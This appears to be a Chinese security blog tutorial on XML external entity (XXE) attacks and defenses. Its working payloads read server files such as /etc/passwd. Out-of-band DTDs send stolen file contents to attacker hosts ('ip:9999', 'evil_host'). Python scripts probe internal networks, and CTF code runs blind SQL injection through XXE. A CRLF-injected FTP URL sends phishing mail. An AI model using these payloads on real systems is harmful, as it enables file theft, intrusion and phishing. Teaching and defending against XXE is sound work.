<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>XXE漏洞基础 | 3lizabeth's Blog</title>
<meta name=keywords content="xxe,web安全,基础漏洞"><meta name=description content="xxe漏洞的基本原理、利用以及防护"><meta name=author content="3lizabeth"><link rel=canonical href=https://leventfrais.github.io/posts/study/xxe_basic/><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"><link crossorigin=anonymous href=/assets/css/stylesheet.7b0b608ff953ab142454b7b89e88e0d704b2d242865330cb2a3ea00ec75c5355.css integrity="sha256-ewtgj/lTqxQkVLe4nojg1wSy0kKGUzDLKj6gDsdcU1U=" rel="preload stylesheet" as=style><link rel=icon href=https://leventfrais.github.io/img/lain.gif><link rel=icon type=image/png sizes=16x16 href=https://leventfrais.github.io/img/lain.gif><link rel=icon type=image/png sizes=32x32 href=https://leventfrais.github.io/img/lain.gif><link rel=apple-touch-icon href=https://leventfrais.github.io/lain.gif><link rel=mask-icon href=https://leventfrais.github.io/lain.gif><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=https://leventfrais.github.io/posts/study/xxe_basic/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="XXE漏洞基础"><meta property="og:description" content="xxe漏洞的基本原理、利用以及防护"><meta property="og:type" content="article"><meta property="og:url" content="https://leventfrais.github.io/posts/study/xxe_basic/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-19T17:44:36+08:00"><meta property="article:modified_time" content="2024-05-19T17:44:36+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XXE漏洞基础"><meta name=twitter:description content="xxe漏洞的基本原理、利用以及防护"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"📚文章","item":"https://leventfrais.github.io/posts/"},{"@type":"ListItem","position":2,"name":"💻学习","item":"https://leventfrais.github.io/posts/study/"},{"@type":"ListItem","position":3,"name":"XXE漏洞基础","item":"https://leventfrais.github.io/posts/study/xxe_basic/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"XXE漏洞基础","name":"XXE漏洞基础","description":"xxe漏洞的基本原理、利用以及防护","keywords":["xxe","web安全","基础漏洞"],"articleBody":"XXE - 外部实体注入（Xml External Entity Injection） 基本信息与概念 定义 XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。\n在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。\nXML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子\n1 2 3 4 5 6 7 \u003c?xml version=\"1.0\"?\u003e //这一行是 XML 文档定义 \u003c!DOCTYPE message [ \u003c!ELEMENT message (receiver ,sender ,header ,msg)\u003e \u003c!ELEMENT receiver (#PCDATA)\u003e \u003c!ELEMENT sender (#PCDATA)\u003e \u003c!ELEMENT header (#PCDATA)\u003e \u003c!ELEMENT msg (#PCDATA)\u003e 上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写\n1 2 3 4 5 6 Myself Someone TheReminder This is an amazing book 其实除了在 DTD 中定义元素**（其实就是对应 XML 中的标签）**以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的。比如：\n1 2 3 4 \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ELEMENT xee ANY \u003e \u003c!ENTITY testMsg \"test\" \u003e]\u003e 这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 \u0026[entity]; 符号进行引用），那么 XML 就可以写成这样\n1 2 3 4 \u0026xxe; mypass 我们使用 \u0026xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 \u0026xxe 就会被 “test” 替换。\n内部与外部实体 实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实际上实体可以从外部的dtd 文件中引用，我们看下面的代码：\n1 2 3 4 5 6 7 8 \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ELEMENT xxe ANY \u003e \u003c!ENTITY file SYSTEM \"file:///c:/test.dtd\" \u003e]\u003e //引用的外部的dtd文件 \u0026file; mypass 这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）\n当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：\n1 \u003c!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”\u003e 这个在我们的攻击中也可以起到和 SYSTEM 一样的作用\n通用实体与参数实体 我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体还可以分成两个派别：通用实体和参数实体\n1.通用实体\n用 \u0026实体名; 引用的实体，在DTD 中定义，在 XML 文档中引用（上面提到的过的就是）\n1 2 3 4 5 6 7 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE updateProfile [\u003c!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"\u003e ]\u003e Joe \u0026file; ... 2.参数实体：\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用 (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体 (3)和通用实体一样，参数实体也可以外部引用\n1 2 3 \u003c!ENTITY % an-element \"\u003c!ELEMENT mytag (subtag)\u003e\"\u003e \u003c!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"\u003e %an-element; %remote-dtd; 参数实体在我们 Blind XXE 中起到了至关重要的作用\n实验一：有回显读取本地文件（常规xxe） 这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件\n本地服务器上解析 XML 的 php 代码：\nxml.php\n1 2 3 4 5 6 7 8 \u003c?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents('php://input'); $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds; ?\u003e payload: 将这整段作为 post-data 使用 post 传入服务器即可\n1 2 3 4 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE creds [ \u003c!ENTITY goodies SYSTEM \"file:///c:/windows/system.ini\"\u003e ]\u003e \u0026goodies; 若文件无特殊符号，则可正常回显\n但若文件含有特殊符号如 \u0026 \u003c [ ] \u003e ;呢，如果直接想要导出这些数据，xml在渲染时就会出错。因此，可以使用CDATA包裹文件数据再导出\nCDATA是一种xml的方法，能够将其中的\u003c\u003e[]等字符当作常量输出，但是它无法转义’]]\u003e’，因为这是他自己的结束标志，就像字符串不能含有\\0字符一样。\n将数据用CDATA包裹，即：\n1 2 3 4 5 6 7 8 \u003c![CDATA[ xxxxxxxx ]]\u003e ------------------------------------- 可以定义三个参数ENTITY，分别代表 % start \"\u003c![CDATA[ % datas\t\"xxxxxxxx\" % end\t\"]]\u003e\" payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ENTITY % dtd SYSTEM \"file:///c:/tpl.txt\"\u003e //引用的一个外部文件，这个文件也可以存放在一个黑客自己搭建的服务器 %dtd; ]\u003e \u003cuser\u003e \u003cusername\u003e \u0026payload; \u003c/username\u003e \u003cpassword\u003e password \u003c/password\u003e \u003c/user\u003e tpl.txt\n1 2 3 4 5 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!ENTITY % start \"\u003c![CDATA[\"\u003e \u003c!ENTITY % file SYSTEM \"file:///c:/xxe.txt\"\u003e //这里是需要读取的文件 \u003c!ENTITY % end \"]]\u003e\"\u003e \u003c!ENTITY payload \"%start;%file;%end;\"\u003e //拼接了上述定义的参数实体 如此就可读取含有\u003c\u003e[]等特殊字符的文件了\n当然也可以不引用外部文件，直接将迭代定义参数实体即可，但是需要注意的是，被包裹的实体在定义时，双引号需要变为单引号，且需要将\"%“转义为html实体编码，即\u0026#37;\npayload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE xxe [ \u003c!ENTITY % start \"\u003c![CDATA[\"\u003e \u003c!ENTITY % file SYSTEM \"file:///c:/xxe.txt\"\u003e \u003c!ENTITY % end \"]]\u003e\"\u003e \u003c!ENTITY % dtd \"\u003c!ENTITY payload '\u0026#37;start;\u0026#37;file;\u0026#37;end;'\u003e\"\u003e %dtd; ]\u003e \u003cuser\u003e \u003cusername\u003e \u0026payload; \u003c/username\u003e \u003cpassword\u003e password \u003c/password\u003e \u003c/user\u003e 实验二：无回显读取本地敏感文件(Blind OOB XXE) 如果服务器端没有xml回显，那么可以选择将读取的文件上传到攻击者个人服务器\n方式同上，定义参数实体，利用一些协议将文件编码后，传输至攻击者的服务器(使用python http nc查看即可)\n注意 因为包裹实体时，实体的值中不能有 %, 所以将其转成html实体编码 %\ntest.dtd\n1 2 \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///C:/test.txt\"\u003e \u003c!ENTITY % int \"\u003c!ENTITY \u0026#37; send SYSTEM 'http://ip:9999?p=%file;'\u003e\"\u003e payload：\n1 2 3 4 \u003c!DOCTYPE convert [ \u003c!ENTITY % remote SYSTEM \"http://ip/test.dtd\"\u003e %remote;%int;%send; ]\u003e 新的思考：\n我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。\n新的利用：\n所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议\n如图所示:\n注意：\n1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35 2.libxml 是 PHP 的 xml 支持\n实验三：HTTP 内网主机探测 我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了\n下面是一个探测脚本的实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import requests import base64 #Origtional XML that the server accepts # # user # def build_xml(string): xml = \"\"\"\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\u003c!ENTITY xxe SYSTEM \"\"\" + '\"' + string + '\"' + \"\"\"\u003e]\u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\"\"\" xml = xml + \"\\r\\n\" + \"\"\" \u0026xxe;\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\"\"\" send_xml(xml) def send_xml(xml): headers = {'Content-Type': 'application/xml'} x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value print coded_string # print base64.b64decode(coded_string) for i in range(1, 255): try: i = str(i) ip = '10.0.0.' + i string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/' print string build_xml(string) except: continue 实验四：HTTP 内网主机端口扫描 找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测\n比如我们传入：\n1 2 3 4 5 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE data SYSTEM \"http://127.0.0.1:515/\" [ \u003c!ELEMENT data (#PCDATA)\u003e ]\u003e 4 返回结果：\n1 2 3 4 5 javax.xml.bind.UnmarshalException - with linked exception: [Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException Exception Description: An error occurred unmarshalling the document Internal Exception: ████████████████████████: Connection refused 这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测，设置替换参数为端口即可\n实验五：内网盲注(CTF) 2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：\n首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错\n既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )\n1 /var/www/52dandan.cc/public_html/config.php 拿到第一部分 flag\n1 2 3 4 5 6 \u003c?php define(BASEDIR, \"/var/www/52dandan.club/\"); define(FLAG_SIG, 1); define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431'); .... ?\u003e 注意：\n这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php 过滤器的一个压缩的方法\n压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”); 解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);\n然后我们考虑内网有没有东西，我们读取\n1 2 /proc/net/arp /etc/host 找到内网的另一台服务器的 ip 地址 192.168.223.18\n拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests url = 'http://39.107.33.75:33899/common.php' s = requests.Session() result = '' data = { \"name\":\"evil_man\", \"email\":\"testabcdefg@gmail.com\", \"comment\":\"\"\"\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % dtd SYSTEM \"http://evil_host/evil.dtd\"\u003e %dtd;]\u003e \"\"\" } for i in range(0,28): for j in range(48,123): f = open('./evil.dtd','w') payload2 = \"\"\"\u003c!ENTITY % file SYSTEM \"php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1\"\u003e \u003c!ENTITY % all \"\u003c!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'\u003e\"\u003e %all; %send;\"\"\".format('_'*i+chr(j)+'_'*(27-i)) f.write(payload2) f.close() print 'test {}'.format(chr(j)) r = s.post(url,data=data) if \"Oti3a3LeLPdkPkqKF84xs=\" in r.content and chr(j)!='_': result += chr(j) print chr(j) break print result 这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解\n实验六：钓鱼： 如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）\nJava支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。\n但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ftp://a%0D%0A EHLO%20a%0D%0A MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A DATA%0D%0A From%3A%20support%40VULNERABLESYSTEM.com%0A To%3A%20victim%40gmail.com%0A Subject%3A%20test%0A %0A test!%0A %0D%0A .%0D%0A QUIT%0D%0A :a@VULNERABLESYSTEM.com:25 当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 ftp://a EHLO a MAIL FROM: RCPT TO: DATA From: support@VULNERABLESYSTEM.com To: victim@gmail.com Subject: Reset your password We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com . QUIT :support@VULNERABLESYSTEM.com:25 这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。\n真实的 XXE 出现在哪 我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方\n如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）\n那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个\n实例一：模拟情况 示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 POST /vulnerable HTTP/1.1 Host: www.test.com User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: https://test.com/test.html Content-Type: application/xml Content-Length: 294 Cookie: mycookie=cookies; Connection: close Upgrade-Insecure-Requests: 1 \u003c?xml version=\"1.0\"?\u003e John, Doe I love XML Computers 9.99 2018-10-01 XML is the best! 我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}\n代表该web服务可以进行xml的类型数据的传输，服务器也会正常接收并处理xml类型。\n此时如果我们传入一个恶意的代码\n1 2 3 4 5 6 7 8 9 10 11 12 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE GVI [\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\" \u003e]\u003e John, Doe I love XML Computers 9.99 2018-10-01 \u0026xxe; 如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回\n1 2 3 4 5 {\"error\": \"no results for description root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync... 实例二：JSON content-type XXE 正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击\n原始请求和响应： HTTP Request:\n1 2 3 4 5 6 7 POST /netspi HTTP/1.1 Host: someserver.netspi.com Accept: application/json Content-Type: application/json Content-Length: 38 {\"search\":\"name\",\"value\":\"netspitest\"} HTTP Response:\n1 2 3 4 5 HTTP/1.1 200 OK Content-Type: application/json Content-Length: 43 {\"error\": \"no results for name netspitest\"} 现在我们尝试将 Content-Type 修改为 application/xml\n进一步请求和响应： HTTP Request:\n1 2 3 4 5 6 7 POST /netspi HTTP/1.1 Host: someserver.netspi.com Accept: application/json Content-Type: application/xml Content-Length: 38 {\"search\":\"name\",\"value\":\"netspitest\"} HTTP Response:\n1 2 3 4 5 HTTP/1.1 500 Internal Server Error Content-Type: application/json Content-Length: 127 {\"errors\":{\"errorMessage\":\"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\"}} 可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击\n最终的请求和响应： HTTP Request:\n1 2 3 4 5 6 7 8 9 10 11 12 POST /netspi HTTP/1.1 Host: someserver.netspi.com Accept: application/json Content-Type: application/xml Content-Length: 288 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE netspi [\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\" \u003e]\u003e name \u0026xxe; HTTP Response:\n1 2 3 4 5 6 7 8 9 HTTP/1.1 200 OK Content-Type: application/json Content-Length: 2467 {\"error\": \"no results for name root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync.... XXE 如何防御 方案一：使用语言中推荐的禁用外部实体的方法 PHP：\n1 libxml_disable_entity_loader(true); JAVA:\n1 2 3 4 5 6 7 8 DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); .setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true); .setFeature(\"http://xml.org/sax/features/external-general-entities\",false) .setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false); Python：\n1 2 from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方案二：手动黑名单过滤(不推荐) 过滤关键词：\n1 \u003c!DOCTYPE、\u003c!ENTITY SYSTEM、PUBLIC 本文原作者 K0rz3n 。文章内容略有删减与修改\n1 https://xz.aliyun.com/t/3357?time__1311=n4%2BxnD0DgGYQwqYq40HpDUhDfxGT%2BALux0K4x\u0026alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-0 ","wordCount":"5574","inLanguage":"zh","datePublished":"2024-05-19T17:44:36+08:00","dateModified":"2024-05-19T17:44:36+08:00","author":[{"@type":"Person","name":"3lizabeth"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://leventfrais.github.io/posts/study/xxe_basic/"},"publisher":{"@type":"Organization","name":"3lizabeth's Blog","logo":{"@type":"ImageObject","url":"https://leventfrais.github.io/img/lain.gif"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://leventfrais.github.io/ accesskey=h title="3lizabeth's Blog (Alt + H)">3lizabeth's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://leventfrais.github.io/search title="🔍搜索 (Alt + /)" accesskey=/><span>🔍搜索</span></a></li><li><a href=https://leventfrais.github.io/ title=🏠主页><span>🏠主页</span></a></li><li><a href=https://leventfrais.github.io/posts title=📚文章><span>📚文章</span></a></li><li><a href=https://leventfrais.github.io/archive title=⏱时间轴><span>⏱时间轴</span></a></li><li><a href=https://leventfrais.github.io/categories title=🧩分类><span>🧩分类</span></a></li><li><a href=https://leventfrais.github.io/tags title=🔖标签><span>🔖标签</span></a></li><li><a href=https://leventfrais.github.io/about title=🙋🏻‍♂️关于><span>🙋🏻‍♂️关于</span></a></li><li><a href=https://leventfrais.github.io/links title=🤝我厚米><span>🤝我厚米</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://leventfrais.github.io/>🏠主页</a>&nbsp;»&nbsp;<a href=https://leventfrais.github.io/posts/>📚文章</a>&nbsp;»&nbsp;<a href=https://leventfrais.github.io/posts/study/>💻学习</a></div><h1 class="post-title entry-hint-parent">XXE漏洞基础</h1><div class=post-description>xxe漏洞的基本原理、利用以及防护</div><div class=post-meta><span title='2024-05-19 17:44:36 +0800 CST'>2024-05-19</span>&nbsp;·&nbsp;12 分钟&nbsp;·&nbsp;3lizabeth</div><div class=meta-item>&nbsp·&nbsp
	  <span id=busuanzi_container_page_pv>本文阅读量<span id=busuanzi_value_page_pv></span>次</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#xxe---%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e6%b3%a8%e5%85%a5xml-external-entity-injection aria-label="XXE - 外部实体注入（Xml External Entity Injection）">XXE - 外部实体注入（Xml External Entity Injection）</a><ul><li><a href=#%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af%e4%b8%8e%e6%a6%82%e5%bf%b5 aria-label=基本信息与概念>基本信息与概念</a><ul><li><a href=#%e5%ae%9a%e4%b9%89 aria-label=定义>定义</a></li><li><a href=#%e5%86%85%e9%83%a8%e4%b8%8e%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93 aria-label=内部与外部实体>内部与外部实体</a></li><li><a href=#%e9%80%9a%e7%94%a8%e5%ae%9e%e4%bd%93%e4%b8%8e%e5%8f%82%e6%95%b0%e5%ae%9e%e4%bd%93 aria-label=通用实体与参数实体>通用实体与参数实体</a></li></ul></li><li><a href=#%e5%ae%9e%e9%aa%8c%e4%b8%80%e6%9c%89%e5%9b%9e%e6%98%be%e8%af%bb%e5%8f%96%e6%9c%ac%e5%9c%b0%e6%96%87%e4%bb%b6%e5%b8%b8%e8%a7%84xxe aria-label=实验一：有回显读取本地文件（常规xxe）>实验一：有回显读取本地文件（常规xxe）</a></li><li><a href=#%e5%ae%9e%e9%aa%8c%e4%ba%8c%e6%97%a0%e5%9b%9e%e6%98%be%e8%af%bb%e5%8f%96%e6%9c%ac%e5%9c%b0%e6%95%8f%e6%84%9f%e6%96%87%e4%bb%b6blind-oob-xxe aria-label="实验二：无回显读取本地敏感文件(Blind OOB XXE)">实验二：无回显读取本地敏感文件(Blind OOB XXE)</a></li><li><a href=#%e5%ae%9e%e9%aa%8c%e4%b8%89http-%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e6%8e%a2%e6%b5%8b aria-label="实验三：HTTP 